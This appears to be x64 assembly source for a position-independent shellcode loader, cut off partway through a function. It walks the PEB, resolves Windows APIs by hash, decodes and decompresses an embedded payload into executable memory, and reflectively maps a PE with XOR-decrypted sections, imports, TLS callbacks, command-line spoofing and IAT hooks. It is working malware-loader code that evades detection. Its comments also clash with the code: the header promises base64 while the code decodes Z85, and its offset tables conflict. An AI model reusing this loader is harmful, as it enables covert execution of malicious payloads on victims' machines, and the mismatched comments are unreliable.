; ============================================================================
; dec_b64_lznt1.asm  ——  位置无关 x64 解码段：Z85 解码 + LZNT1 解压
;
; 只做两件事：把 base64 文本解成字节（标准表 A-Za-z0-9+/），
;             再调用 ntdll!RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1=2) 解压。
; 不做 RC4、不做分节 XOR、不解析 PE —— 解压出来的就是原始 PE/载荷字节。
;
; 编译（测试版，可直接当 shellcode 跑）：
;     nasm -f bin -o dec_test.bin dec_b64_lznt1.asm -DTEST_HARNESS
; 编译（模块版，拼进 loader_x64.asm 用）：
;     nasm -f bin -o dec.bin dec_b64_lznt1.asm
;
; ---------------- 数据块（紧跟本段代码之后，偏移 = 本段文件长度） ----------
;   +0x00  u32  b64len    base64 文本字节数（不含结尾 \0，文本本身无 \0）
;   +0x04  u32  complen   base64 解码后的字节数 = 压缩数据长度
;   +0x08  u32  rawlen    解压后长度
;   +0x0C  u64  expect    FNV-1a 64（测试版校验用，生产版可填 0）
;   +0x14  ...  base64 文本 b64len 字节
;
; ---------------- 生产版调用约定 ------------------------------------------
;   rcx = 数据块指针（自己算：段地址 + 段长度，或 any）
;   call b64_decode_payload
;   返回：rdi = 解压后的缓冲（PAGE_EXECUTE_READWRITE），rax = 解压后字节数
;         失败：rax = 0
;   保留 rbx / rbp / rsi / r12-r15；只改 rax rcx rdx rdi r8-r11
;
;   典型拼法（在 loader_x64.asm 里把"定位 EXE 起始"换成解码）：
;       lea   rcx, [rel args_block]      ; 数据块放在本段末尾即可
;       call  b64_decode_payload
;       test  rax, rax
;       jz    fail
;       ; 此时 rdi 已经是 PE 头，接着走原来的 SizeOfImage/VirtualAlloc/节拷贝流程
; ============================================================================

BITS 64

HASH_GETPROCADDRESS equ 0xcf31bb1f
HASH_LOADLIBRARYA   equ 0x5fbff0fb
HASH_VIRTUALALLOC   equ 0x382c0f97
HASH_RTLDECOMPRESS  equ 0xf73bbd46      ; djb2("RtlDecompressBuffer")
HASH_EXITPROCESS    equ 0xb769339e      ; djb2("ExitProcess")
HASH_TLSALLOC       equ 0x8bf55163      ; djb2("TlsAlloc")
HASH_GETCMDLINEA    equ 0xb511fc4d      ; djb2("GetCommandLineA")
HASH_GETMODULEFILENAMEW equ 0x13b8a163  ; djb2("GetModuleFileNameW")
HASH_LOADLIBRARYEXW equ 0x4f803c8e      ; djb2("LoadLibraryExW")
HASH_LCIDTOLOCALENAME equ 0x377c5455    ; djb2("LCIDToLocaleName")
HASH_GETUSERDEFAULTUILANG equ 0xb16cda6b ; djb2("GetUserDefaultUILanguage")
HASH_GETMODULEHANDLEA equ 0x5a153f58
HASH_FORMATMESSAGEW  equ 0x128804ea
HASH_SETLASTERROR    equ 0x6beb4b6f
HASH_FINDRESOURCEW   equ 0x3c704e45
HASH_FINDRESOURCEEXW equ 0x19bcb6c2
HASH_LOADRESOURCE    equ 0x0dcde594d
HASH_SIZEOFRESOURCE  equ 0x0c17a85d   ; djb2("GetModuleHandleA")
B64_H_IMPRVA        equ 0x10

; 容器头字段偏移（与 tools/pack_b64_lznt1.py:build_container 对应）
B64_H_TLSRVA        equ 0x1C
B64_H_TLSSIZE       equ 0x20
B64_H_PDATARVA      equ 0x24
B64_H_PDATASIZE     equ 0x28
B64_H_HDRSIZE       equ 0x2C
B64_H_HDROFF        equ 0x30
B64_H_NSECT         equ 0x34
B64_H_KEYLEN        equ 0x38
B64_H_KEY           equ 0x3C

FNV_OFFSET          equ 0xCBF29CE484222325
FNV_PRIME           equ 0x100000001B3

%ifdef TEST_HARNESS
    jmp   b64_start                     ; 保证偏移 0 就是入口
%endif
%ifdef RUN_CONTAINER
    jmp   b64_run_start                 ; 容器模式独立入口
%endif
%ifdef RUN_RAW
    jmp   b64_raw_start                 ; 裸 shellcode 模式独立入口
%endif

; ---------------------------------------------------------------------------
; b64_find_export: 输入 rdx = 模块基址, r8d = 导出名 djb2 哈希；输出 rax
; 保留 rbx / rsi / rdi / r12-r15，只改 rax rcx rdx r8-r11
; ---------------------------------------------------------------------------
b64_find_export:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15

    mov  r12, rdx
    mov  r13d, r8d

    mov  eax, [r12 + 0x3C]              ; e_lfanew
    test eax, eax
    jz   .notfound
    add  rax, r12
    mov  eax, [rax + 0x88]              ; DataDirectory[0].VirtualAddress
    test eax, eax
    jz   .notfound
    add  rax, r12
    mov  r14, rax
    mov  ecx, [r14 + 0x18]              ; NumberOfNames
    mov  r15d, [r14 + 0x20]             ; AddressOfNames

    xor  ebx, ebx
.loop:
    cmp  ebx, ecx
    jae  .notfound
    lea  rdi, [r12 + r15]
    mov  esi, [rdi + rbx*4]
    add  rsi, r12
    mov  eax, 5381
.hash:
    movzx edx, byte [rsi]
    test edx, edx
    jz   .cmp
    imul eax, eax, 33
    add  eax, edx
    inc  rsi
    jmp  .hash
.cmp:
    cmp  eax, r13d
    je   .found
    inc  ebx
    jmp  .loop

.found:
    mov  eax, [r14 + 0x24]              ; AddressOfNameOrdinals
    add  rax, r12
    movzx eax, word [rax + rbx*2]
    mov  ecx, [r14 + 0x1C]              ; AddressOfFunctions
    add  rcx, r12
    mov  eax, [rcx + rax*4]
    add  rax, r12
    jmp  .done
.notfound:
    xor  eax, eax
.done:
    pop  r15
    pop  r14
    pop  r13
    pop  r12
    pop  rdi
    pop  rsi
    pop  rbx
    ret

; ---------------------------------------------------------------------------
; b64_fnv64: 输入 rcx = buf, rdx = len；输出 rax = FNV-1a 64
; ---------------------------------------------------------------------------
b64_fnv64:
    mov  rax, FNV_OFFSET
    mov  r8, FNV_PRIME
    test rdx, rdx
    jz   .done
.loop:
    movzx r9d, byte [rcx]
    xor  rax, r9
    imul rax, r8
    inc  rcx
    dec  rdx
    jnz  .loop
.done:
    ret

; ---------------------------------------------------------------------------
; b64_decode: 输入 rcx = src, rdx = srclen, r8 = dst；输出 rax = 写出字节数
; 算术映射，不需要 256 字节查表；'=' 或非法字符按结束/跳过处理
; ---------------------------------------------------------------------------
b64_decode:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15

    mov  rsi, rcx                   ; src
    mov  rdi, r8                    ; dst
    mov  rax, rdx
    xor  edx, edx
    mov  ecx, 5
    div  rcx                        ; rax = 组数（5 字符 -> 4 字节）
    mov  r12, rax
    xor  r13d, r13d                 ; 写出字节数
    lea  r15, [rel z85_tab]
.grp:
    test r12, r12
    jz   .done
    xor  r14d, r14d                 ; 值累加器
    mov  ebx, 5
.ch:
    movzx eax, byte [rsi]
    inc  rsi
    sub  eax, 33
    cmp  eax, 95
    jae  .bad
    movzx eax, byte [r15 + rax]
    cmp  eax, 0xFF
    je   .bad
    imul r14d, r14d, 85
    add  r14d, eax
    dec  ebx
    jnz  .ch
    mov  eax, r14d
    bswap eax
    mov  [rdi], eax
    add  rdi, 4
    add  r13, 4
    dec  r12
    jmp  .grp
.done:
    mov  rax, r13
    jmp  .out
.bad:
    xor  eax, eax
.out:
    pop  r15
    pop  r14
    pop  r13
    pop  r12
    pop  rdi
    pop  rsi
    pop  rbx
    ret

; b64_decode_payload: 输入 rcx = 数据块；输出 rdi = 解压后缓冲, rax = 长度
; ---------------------------------------------------------------------------
b64_decode_payload:
    push rbx
    push rbp
    push rsi
    push r12
    push r13
    push r14
    push r15
    sub  rsp, 0x50

    mov  r12, rcx                       ; 数据块
    mov  eax, [r12 + 0x00]
    mov  [rsp + 0x20], rax              ; b64len
    mov  eax, [r12 + 0x04]
    mov  [rsp + 0x28], rax              ; complen
    mov  eax, [r12 + 0x08]
    mov  [rsp + 0x30], rax              ; rawlen

    ; ---- PEB -> ntdll / kernel32 ----
    mov  rax, gs:[0x60]
    mov  rax, [rax + 0x18]              ; PEB->Ldr
    mov  rax, [rax + 0x20]              ; InMemoryOrderModuleList.Flink
    mov  rax, [rax]                     ; 第 2 个模块 = ntdll
    mov  r14, [rax + 0x20]
    mov  rax, [rax]                     ; 第 3 个模块 = kernel32
    mov  r15, [rax + 0x20]

    mov  rdx, r14
    mov  r8d, HASH_RTLDECOMPRESS
    call b64_find_export
    test rax, rax
    jz   .fail
    mov  rbp, rax                       ; RtlDecompressBuffer

    mov  rdx, r15
    mov  r8d, HASH_VIRTUALALLOC
    call b64_find_export
    test rax, rax
    jz   .fail
    mov  r13, rax                       ; VirtualAlloc

    ; ---- 1) base64 解码到 RW 缓冲 ----
    xor  ecx, ecx
    mov  rdx, [rsp + 0x28]
    add  rdx, 0x1000
    mov  r8d, 0x3000                    ; MEM_COMMIT|MEM_RESERVE
    mov  r9d, 0x04                      ; PAGE_READWRITE
    call r13
    test rax, rax
    jz   .fail
    mov  rbx, rax

    mov  rcx, r12
    add  rcx, 0x14
    mov  rdx, [rsp + 0x20]
    mov  r8, rbx
    call b64_decode
    cmp  rax, [rsp + 0x28]
    jb   .fail                          ; z85 会补到 5 字符整组，>= complen 即可

    ; ---- 2) 申请 RWX 输出缓冲并解压 ----
    xor  ecx, ecx
    mov  rdx, [rsp + 0x30]
    add  rdx, 0x10000
    mov  r8d, 0x3000
    mov  r9d, 0x40                      ; PAGE_EXECUTE_READWRITE
    call r13
    test rax, rax
    jz   .fail
    mov  rdi, rax

    mov  dword [rsp + 0x00], 0          ; FinalSize
    mov  r10, [rsp + 0x28]              ; complen  -> arg5
    mov  r9, rbx                        ; src      -> arg4
    mov  r8, [rsp + 0x30]               ; rawlen   -> arg3
    mov  rdx, rdi                       ; dst      -> arg2
    mov  ecx, 2                         ; LZNT1    -> arg1
    lea  rax, [rsp + 0x00]              ; &FinalSize -> arg6
    sub  rsp, 0x30
    mov  [rsp + 0x20], r10
    mov  [rsp + 0x28], rax
    call rbp
    add  rsp, 0x30
    test eax, eax                       ; NTSTATUS == 0 才算成功
    jnz  .fail

    mov  rax, [rsp + 0x30]              ; 返回长度
    jmp  .out
.fail:
    xor  eax, eax
.out:
    add  rsp, 0x50
    pop  r15
    pop  r14
    pop  r13
    pop  r12
    pop  rsi
    pop  rbp
    pop  rbx
    ret

; ---------------------------------------------------------------------------
; 测试入口：解码 -> FNV-1a 64 比对 -> ExitProcess(0/1)
; ---------------------------------------------------------------------------
%ifdef TEST_HARNESS
b64_start:
    sub  rsp, 0x48

    lea  rcx, [rel b64_data_block]
    call b64_decode_payload
    test rax, rax
    jz   .bad

    mov  rdx, rax
    mov  rcx, rdi
    call b64_fnv64

    lea  rdx, [rel b64_data_block]
    cmp  rax, [rdx + 0x0C]
    jne  .bad

    xor  r15d, r15d                     ; exit code 0
    jmp  .exit
.bad:
    mov  r15d, 1
.exit:
    mov  rax, gs:[0x60]
    mov  rax, [rax + 0x18]
    mov  rax, [rax + 0x20]
    mov  rax, [rax]
    mov  rax, [rax]
    mov  rdx, [rax + 0x20]
    mov  r8d, HASH_EXITPROCESS
    call b64_find_export
    mov  ecx, r15d
    sub  rsp, 0x20
    call rax
%endif

; ---------------------------------------------------------------------------
; 数据块占位（打包器把内容写到这里，即本文件末尾）
; ---------------------------------------------------------------------------
; ===========================================================================
;                       容器层（PE 精简中间表示）
;
; 容器布局（小端）：
;   +0x00 u32 SizeOfImage
;   +0x04 u32 EntryRVA
;   +0x08 u64 ImageBase
;   +0x10 u32 ImportRVA
;   +0x14 u32 RelocRVA
;   +0x18 u32 RelocSize
;   +0x1C u32 TLSRVA          0 = 没有 TLS 目录
;   +0x20 u32 TLSSize
;   +0x24 u32 NSect
;   +0x28 u32 KeyLen          0 = 节数据不加密
;   +0x2C ...   Key[KeyLen]
;   +0x2C+KeyLen: NSect × { u32 RVA, u32 DataOff, u32 RawSize }   DataOff 相对容器起点
;   之后：各节数据紧排
;
; 与样本 payload_x64(1).bin 的容器同思路（头 + 节表 + 密钥 + 紧排节数据），
; 差别：节数可变（样本硬编码 5 节）、单把密钥（样本 3 把）、头 0x20 起（样本 0x6C）。
; ===========================================================================

; ---------------------------------------------------------------------------
; b64_memcpy: rcx=dst, rdx=src, r8=len （不破坏 r10/r11）
; ---------------------------------------------------------------------------
b64_memcpy:
    push rdi
    push rsi
    mov  rsi, rdx
    mov  rdi, rcx
    mov  rcx, r8
    rep  movsb
    pop  rsi
    pop  rdi
    ret

; ---------------------------------------------------------------------------
; b64_xor: rcx=dst, rdx=len, r8=key, r9=keylen
; ---------------------------------------------------------------------------
b64_xor:
    test r9, r9
    jz   .ret
    xor  r10, r10                       ; dst 下标
    xor  r11, r11                       ; key 下标
.l:
    cmp  r10, rdx
    jae  .ret
    movzx eax, byte [r8 + r11]
    xor  [rcx + r10], al
    inc  r10
    inc  r11
    cmp  r11, r9
    jb   .l
    xor  r11, r11
    jmp  .l
.ret:
    ret

; ---------------------------------------------------------------------------
; b64_build_image: 容器 -> 内存镜像
;   输入: rcx = 容器指针, r9 = VirtualAlloc 函数指针
;   输出: rdi = 镜像基址（失败 0）, rax = SizeOfImage
; ---------------------------------------------------------------------------
b64_build_image:
    push rbx
    push rbp
    push rsi
    push r12
    push r13
    push r14
    push r15
    sub  rsp, 0x30

    mov  r12, rcx                       ; 容器
    mov  r13, r9                        ; VirtualAlloc
    mov  r14d, [r12 + 0x00]             ; SizeOfImage

    ; 优先按首选基址分配，失败再随机
    mov  rcx, [r12 + 0x08]              ; ImageBase(64)
    mov  rdx, r14
    mov  r8d, 0x3000                    ; MEM_COMMIT|MEM_RESERVE
    mov  r9d, 0x40                      ; PAGE_EXECUTE_READWRITE
    call r13
    test rax, rax
    jnz  .have
    xor  ecx, ecx
    mov  rdx, r14
    mov  r8d, 0x3000
    mov  r9d, 0x40
    call r13
    test rax, rax
    jz   .fail
.have:
    mov  rdi, rax                       ; 镜像

    ; 把 PE 头写回镜像（mingw CRT 的 _pei386_runtime_relocator 会读自身 .reloc 目录）
    mov  eax, [r12 + B64_H_HDRSIZE]
    test eax, eax
    jz   .no_hdr
    mov  r8, rax
    mov  rcx, rdi
    mov  edx, [r12 + B64_H_HDROFF]
    lea  rdx, [r12 + rdx]
    call b64_memcpy
.no_hdr:

    mov  esi, [r12 + B64_H_NSECT]       ; NSect
    mov  ebx, [r12 + B64_H_KEYLEN]      ; KeyLen
    lea  rbp, [r12 + B64_H_KEY]
    add  rbp, rbx                       ; 节表基址
    mov  dword [rsp + 0x20], 0          ; i

.sect_loop:
    mov  ecx, [rsp + 0x20]
    cmp  ecx, esi
    jae  .ok
    mov  eax, ecx
    lea  eax, [rax + rax*2]             ; i*3
    shl  eax, 2                         ; i*12
    lea  rbx, [rbp + rax]               ; &sect[i]
    mov  r10d, [rbx + 0x08]             ; RawSize
    test r10d, r10d
    jz   .next_sect
    mov  eax, [rbx + 0x00]              ; RVA
    lea  r8, [rdi + rax]                ; dst
    mov  r11, r8
    mov  eax, [rbx + 0x04]              ; DataOff
    lea  rdx, [r12 + rax]               ; src
    mov  rcx, r8
    mov  r8, r10
    call b64_memcpy
    mov  eax, [r12 + B64_H_KEYLEN]      ; KeyLen
    test eax, eax
    jz   .next_sect
    mov  rcx, r11
    mov  edx, [rbx + 0x08]
    lea  r8, [r12 + B64_H_KEY]
    mov  r9d, [r12 + B64_H_KEYLEN]
    call b64_xor
.next_sect:
    inc  dword [rsp + 0x20]
    jmp  .sect_loop

.ok:
    mov  rax, r14
    jmp  .out
.fail:
    xor  eax, eax
    xor  edi, edi
.out:
    add  rsp, 0x30
    pop  r15
    pop  r14
    pop  r13
    pop  r12
    pop  rsi
    pop  rbp
    pop  rbx
    ret

; ---------------------------------------------------------------------------
; b64_reloc: 应用基址重定位
;   输入: rcx = 镜像, edx = 重定位表 RVA, r8d = 重定位大小, r9 = delta
; ---------------------------------------------------------------------------
b64_reloc:
    push rbx
    push rsi
    push rbp
    push r12
    test edx, edx
    jz   .done
    test r8d, r8d
    jz   .done
    mov  rsi, rcx                       ; 镜像
    lea  rbp, [rsi + rdx]               ; 首个块
    lea  rbx, [rbp + r8]                ; 结束
.blk:
    cmp  rbp, rbx
    jae  .done
    mov  r10d, [rbp + 0x00]             ; page RVA
    add  r10, rsi
    mov  r11d, [rbp + 0x04]             ; blockSize
    test r11d, r11d
    jz   .done
    lea  r11, [rbp + r11]               ; 本块结束
    lea  r12, [rbp + 0x08]              ; 首个项
.ent:
    cmp  r12, r11
    jae  .nextblk
    movzx eax, word [r12]
    mov  ecx, eax
    shr  ecx, 12                        ; type
    and  eax, 0x0FFF                    ; offset
    lea  rdx, [r10 + rax]
    cmp  ecx, 10                        ; DIR64
    je   .t10
    cmp  ecx, 3                         ; HIGHLOW
    je   .t3
    jmp  .enext
.t10:
    mov  rax, [rdx]
    add  rax, r9
    mov  [rdx], rax
    jmp  .enext
.t3:
    mov  eax, [rdx]
    add  eax, r9d
    mov  [rdx], eax
.enext:
    add  r12, 2
    jmp  .ent
.nextblk:
    mov  r11d, [rbp + 0x04]
    test r11d, r11d
    jz   .done
    add  rbp, r11
    jmp  .blk
.done:
    pop  r12
    pop  rbp
    pop  rsi
    pop  rbx
    ret

; ---------------------------------------------------------------------------
; b64_imports: 修复 IAT
;   输入: rcx = 镜像, edx = 导入表 RVA, r8 = LoadLibraryA, r9 = GetProcAddress
; ---------------------------------------------------------------------------
b64_imports:
    push rbx
    push rbp
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    sub  rsp, 0x38

    mov  rsi, rcx                       ; 镜像
    mov  rbp, r8                        ; LoadLibraryA
    mov  r15, r9                        ; GetProcAddress
    test edx, edx
    jz   .done
    lea  rbx, [rsi + rdx]               ; IMAGE_IMPORT_DESCRIPTOR

.dsc:
    mov  eax, [rbx + 0x0C]              ; Name RVA
    test eax, eax
    jz   .done
    lea  rcx, [rsi + rax]
    call rbp                            ; LoadLibraryA(dll)
    mov  r14, rax                       ; hmod

    mov  r12d, [rbx + 0x00]             ; OriginalFirstThunk
    test r12d, r12d
    jnz  .oft_ok
    mov  r12d, [rbx + 0x10]             ; 回退到 FirstThunk
.oft_ok:
    lea  r12, [rsi + r12]               ; thunk 指针
    mov  r13d, [rbx + 0x10]
    lea  r13, [rsi + r13]               ; IAT 指针

.thunk:
    mov  rax, [r12]
    test rax, rax
    jz   .nextdsc
    js   .byord
    mov  rcx, r14                       ; hmod
    lea  rdx, [rsi + rax]
    add  rdx, 2                         ; 跳过 Hint
    call r15                            ; GetProcAddress(hmod, name)
    jmp  .store
.byord:
    mov  rcx, r14                       ; hmod
    movzx edx, ax                       ; 序号
    call r15
.store:
    mov  [r13], rax
    add  r12, 8
    add  r13, 8
    jmp  .thunk
.nextdsc:
    add  rbx, 0x14
    jmp  .dsc

.done:
    add  rsp, 0x38
    pop  r15
    pop  r14
    pop  r13
    pop  r12
    pop  rdi
    pop  rsi
    pop  rbp
    pop  rbx
    ret

; ---------------------------------------------------------------------------
; b64_tls: 恢复 TLS（PE 的 TLS 目录）
;   输入: rcx = 镜像, rdx = 容器, r8 = kernel32 基址, r9 = VirtualAlloc
;   做四件事：TlsAlloc -> 写 __tls_index -> 分配并填充 TLS 模板 -> 写 TEB 槽
;             最后按 DLL_PROCESS_ATTACH 调 TLS 回调
;   容器里 TLSRVA = 0 时直接返回
; ---------------------------------------------------------------------------
b64_tls:
    push rbx
    push rbp
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    sub  rsp, 0x40

    mov  r12, rcx                       ; 镜像
    mov  r13, rdx                       ; 容器
    mov  r14, r8                        ; kernel32
    mov  r15, r9                        ; VirtualAlloc

    mov  eax, [r13 + B64_H_TLSRVA]
    test eax, eax
    jz   .done
    lea  rbx, [r12 + rax]               ; IMAGE_TLS_DIRECTORY64

    ; ---- TlsAlloc ----
    mov  rdx, r14
    mov  r8d, HASH_TLSALLOC
    call b64_find_export
    test rax, rax
    jz   .cb
    call rax                            ; TlsAlloc()
    cmp  eax, 0xFFFFFFFF                ; TLS_OUT_OF_INDEXES
    je   .cb
    mov  [rsp + 0x20], eax              ; index

    mov  r10, [rbx + 0x10]              ; AddressOfIndex（已重定位）
    test r10, r10
    jz   .alloc
    mov  [r10], eax

.alloc:
    ; ---- 分配 TLS 模板（模板长度 + SizeOfZeroFill）----
    mov  rcx, [rbx + 0x08]              ; EndAddressOfRawData
    sub  rcx, [rbx + 0x00]              ; StartAddressOfRawData
    mov  eax, [rbx + 0x20]              ; SizeOfZeroFill
    add  rcx, rax
    test rcx, rcx
    jz   .teb
    mov  [rsp + 0x28], rcx              ; 总长度

    xor  ecx, ecx
    mov  rdx, [rsp + 0x28]
    mov  r8d, 0x3000                    ; MEM_COMMIT|MEM_RESERVE
    mov  r9d, 0x04                      ; PAGE_READWRITE
    call r15
    test rax, rax
    jz   .cb
    mov  [rsp + 0x30], rax              ; 数据块

    mov  rcx, [rbx + 0x08]              ; 模板长度
    sub  rcx, [rbx + 0x00]
    test rcx, rcx
    jz   .teb
    mov  r8, rcx                        ; len
    mov  rcx, rax                       ; dst
    mov  rdx, [rbx + 0x00]              ; src
    call b64_memcpy

.teb:
    ; ---- TEB->ThreadLocalStoragePointer[index] = 数据块 ----
    mov  rax, gs:[0x30]                 ; TEB
    mov  rax, [rax + 0x58]              ; ThreadLocalStoragePointer
    test rax, rax
    jz   .cb                            ; 宿主还没建表，跳过（不影响回调）
    mov  ecx, [rsp + 0x20]              ; index
    cmp  ecx, 63                        ; 宿主数组容量 64 项，越界就别写
    jae  .cb
    mov  rdx, [rsp + 0x30]              ; 数据块
    mov  [rax + rcx * 8], rdx

.cb:
    ; ---- TLS 回调（DLL_PROCESS_ATTACH）----
    mov  rsi, [rbx + 0x18]              ; AddressOfCallBacks
    test rsi, rsi
    jz   .done
.loop:
    mov  rax, [rsi]
    test rax, rax
    jz   .done
    mov  rcx, r12                       ; DllHandle
    mov  edx, 1                         ; DLL_PROCESS_ATTACH
    xor  r8d, r8d                       ; Reserved
    call rax
    add  rsi, 8
    jmp  .loop

.done:
    add  rsp, 0x40
    pop  r15
    pop  r14
    pop  r13
    pop  r12
    pop  rdi
    pop  rsi
    pop  rbp
    pop  rbx
    ret

; ---------------------------------------------------------------------------
b64_fix_cmdline:                        ; rcx = 容器, r8 = kernel32 基址
    push rsi
    push rbx
    push r12
    push r13
    push r14
    push r15
    sub  rsp, 0x28

    mov  r12, rcx
    mov  [rsp + 0x20], r8               ; kernel32
    mov  rbx, gs:[0x60]
    mov  rbx, [rbx + 0x20]              ; ProcessParameters
    test rbx, rbx
    jz   .ret

    mov  eax, [r12 + B64_H_NSECT]       ; NSect
    lea  eax, [rax + rax*2]
    shl  eax, 2
    mov  edx, [r12 + B64_H_KEYLEN]      ; KeyLen
    lea  r13, [r12 + B64_H_KEY]
    add  r13, rdx
    add  r13, rax

    mov  ecx, [r13]                     ; 命令行字节数
    test ecx, ecx
    jnz  .have_cmd
    lea  rsi, [rel b64_fake_name]       ; 缺省 "X.exe"
    mov  ecx, 10
    jmp  .set
.have_cmd:
    add  r13, 4
    mov  rsi, r13
.set:
    mov  r14, rsi                       ; UTF-16 源
    mov  r15d, ecx                      ; 字节数

    mov  rdi, [rbx + 0x78]              ; 原 CommandLine.Buffer
    test rdi, rdi
    jz   .keep
    mov  rdx, rcx
    cld
    rep  movsb                          ; 直接覆盖原缓冲
    mov  word [rdi], 0                  ; 末尾补 NUL（解析器靠它停）
    mov  rcx, rdx
.keep:
    mov  word [rbx + 0x70], cx          ; Length
    mov  word [rbx + 0x72], cx          ; MaximumLength

    ; ---- 同步 kernelbase 的 GetCommandLineA 缓存 ----
    ; 宿主进程启动时已经 pop 过 ANSI 缓存，光改 PEB 对它无效；mingw CRT 的
    ; argv 正是从这里取的。做法：拿到缓存指针，把我们的串就地转成 ANSI 覆盖。
    mov  rdx, [rsp + 0x20]
    test rdx, rdx
    jz   .ret
    mov  r8d, HASH_GETCMDLINEA
    call b64_find_export
    test rax, rax
    jz   .ret
    call rax                            ; GetCommandLineA()
    test rax, rax
    jz   .ret
    mov  rdi, rax

    ; 现有缓存长度（不含 NUL）
    xor  rcx, rcx
.len_old:
    cmp  byte [rdi + rcx], 0
    je   .len_ok
    inc  rcx
    cmp  rcx, 0x8000
    jb   .len_old
    jmp  .ret
.len_ok:
    mov  r9, r15
    shr  r9, 1                          ; 需要的字符数
    cmp  r9, rcx
    ja   .ret                           ; 放不下就放弃（避免踩坏堆）

    mov  rsi, r14
    mov  rcx, r9
.cnv:
    test rcx, rcx
    jz   .cnv_done
    movzx eax, word [rsi]
    test eax, eax
    jz   .cnv_done
    cmp  eax, 0x7F
    ja   .ret                           ; 非 ASCII 就整体放弃，别写半截
    mov  [rdi], al
    inc  rdi
    add  rsi, 2
    dec  rcx
    jmp  .cnv
.cnv_done:
    mov  byte [rdi], 0
.ret:
    add  rsp, 0x28
    pop  r15
    pop  r14
    pop  r13
    pop  r12
    pop  rbx
    pop  rsi
    ret

b64_fake_name:
    dw   'X',0,'.',0,'e',0,'x',0,'e',0

; ---------------------------------------------------------------------------
; Path / MUI compat layer
;   GetModuleFileNameW(NULL)  -> original path carried by the container
;   LoadStringW(NULL, id, ..) -> same call against "<dir>\<lang>\<name>.mui"
; Both are installed by rewriting the target image IAT at load time.
; ---------------------------------------------------------------------------

; rcx = wide src (NUL terminated), rdi = dst -> rdi advanced, rax clobbered
; b64_streq: rcx = 待测串, rdx = 目标串 -> al = 1 相等 / 0 不等
b64_streq:
    push rcx
    push rdx
.loop:
    mov  al, [rcx]
    cmp  al, [rdx]
    jne  .ne
    test al, al
    jz   .eq
    inc  rcx
    inc  rdx
    jmp  .loop
.ne:
    xor  eax, eax
    pop  rdx
    pop  rcx
    ret
.eq:
    mov  eax, 1
    pop  rdx
    pop  rcx
    ret

; -> rax = MUI HMODULE for the carried module path (cached, 0 on failure)
%ifndef B64_NO_COMPAT
b64_mui_get:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    sub  rsp, 0x20

    mov  rax, [rel b64_g_mui]
    test rax, rax
    jnz  .done

    mov  rdx, [rel b64_g_k32]
    mov  r8d, HASH_LOADLIBRARYEXW
    call b64_find_export
    test rax, rax
    jz   .null
    mov  r13, rax

    mov  r12, [rel b64_g_mui1]
    test r12, r12
    jz   .try2
    mov  rcx, r12
    xor  edx, edx
    mov  r8d, 2
    call r13
    test rax, rax
    jnz  .got
.try2:
    mov  r12, [rel b64_g_mui2]
    test r12, r12
    jz   .null
    mov  rcx, r12
    xor  edx, edx
    mov  r8d, 2
    call r13
    test rax, rax
    jz   .null
.got:
    mov  [rel b64_g_mui], rax
    jmp  .done
.null:
    xor  eax, eax
.done:
    add  rsp, 0x20
    pop  r13
    pop  r12
    pop  rdi
    pop  rsi
    pop  rbx
    ret


; DWORD FormatMessageW(flags, src, id, lang, buf, n, args)
; 真函数失败（例如 src 是私有映射、不在 loader 链里）时，改用
; LoadLibraryExW(<原 exe 路径>, 0, LOAD_LIBRARY_AS_DATAFILE) 的模块重试一次
b64_shim_fmt:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    sub  rsp, 0x30                  ; 帧 + 3 个栈参的副本位（保持 16 对齐）
    ; 把调用方的第 5/6/7 个栈参复制到本帧（原栈参在 rsp+0x80/0x88/0x90）
    mov  rax, [rsp+0x80]
    mov  [rsp+0x20], rax
    mov  rax, [rsp+0x88]
    mov  [rsp+0x28], rax
    mov  rax, [rsp+0x90]
    mov  [rsp+0x30], rax
    mov  ebx, ecx                   ; flags
    mov  rsi, rdx                   ; src
    mov  r12d, r8d                  ; id
    mov  r13d, r9d                  ; lang
    test rsi, rsi
    jz   .first
    cmp  rsi, [rel b64_g_img]       ; lpSource == 自建镜像 → 真函数会 AV
    je   .retry
.first:
    call qword [rel b64_g_fmt]
    test eax, eax
    jnz  .out
.retry:
    call b64_dfile_get
    test rax, rax
    jz   .out
    mov  ecx, ebx
    mov  rdx, rax
    mov  r8d, r12d
    mov  r9d, r13d
    call qword [rel b64_g_fmt]
.out:
    add  rsp, 0x30
    pop  r13
    pop  r12
    pop  rdi
    pop  rsi
    pop  rbx
    ret

; -> rax = LoadLibraryExW(<ModPath>, 0, LOAD_LIBRARY_AS_DATAFILE) 结果（缓存）
b64_dfile_get:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    sub  rsp, 0x20
    mov  rax, [rel b64_g_dfile]
    test rax, rax
    jnz  .done
    mov  rsi, [rel b64_g_mp_ptr]
    test rsi, rsi
    jz   .null
    mov  rdx, [rel b64_g_k32]
    mov  r8d, HASH_LOADLIBRARYEXW
    call b64_find_export
    test rax, rax
    jz   .null
    mov  r13, rax
    mov  rcx, rsi
    xor  edx, edx
    mov  r8d, 2
    call r13
    test rax, rax
    jz   .null
    mov  [rel b64_g_dfile], rax
    jmp  .done
.null:
    xor  eax, eax
.done:
    add  rsp, 0x20
    pop  r13
    pop  r12
    pop  rdi
    pop  rsi
    pop  rbx
    ret

; GetModuleFileNameW shim: rcx=hModule rdx=buf r8d=size
b64_shim_gmfn:
    test rcx, rcx
    jnz  .real
    mov  r9, [rel b64_g_mp_ptr]
    test r9, r9
    jz   .real
    mov  eax, [rel b64_g_mp_len]
    shr  eax, 1
    jz   .real
    mov  r10d, r8d
    dec  r10d
    jle  .real
    cmp  eax, r10d
    jbe  .len_ok
    mov  eax, r10d
.len_ok:
    push rcx
    push rsi
    push rdi
    mov  ecx, eax
    mov  rsi, r9
    mov  rdi, rdx
    rep  movsw
    mov  word [rdi], 0
    pop  rdi
    pop  rsi
    pop  rcx
    ret
.real:
    mov  rax, [rel b64_g_gmfn]
    jmp  rax

; LoadStringW shim: rcx=hInstance edx=id r8=buf r9d=cch
; 先按原句柄调真函数；返回 0（说明 .rsrc 里没有 RT_STRING）再换 MUI 重试
b64_shim_lsw:
    push rbx
    push rsi
    push rbp
    push rdi
    push r12
    sub  rsp, 0x30
    mov  ebx, ecx                   ; hInstance
    mov  esi, edx                   ; id
    mov  rbp, r8                    ; buf
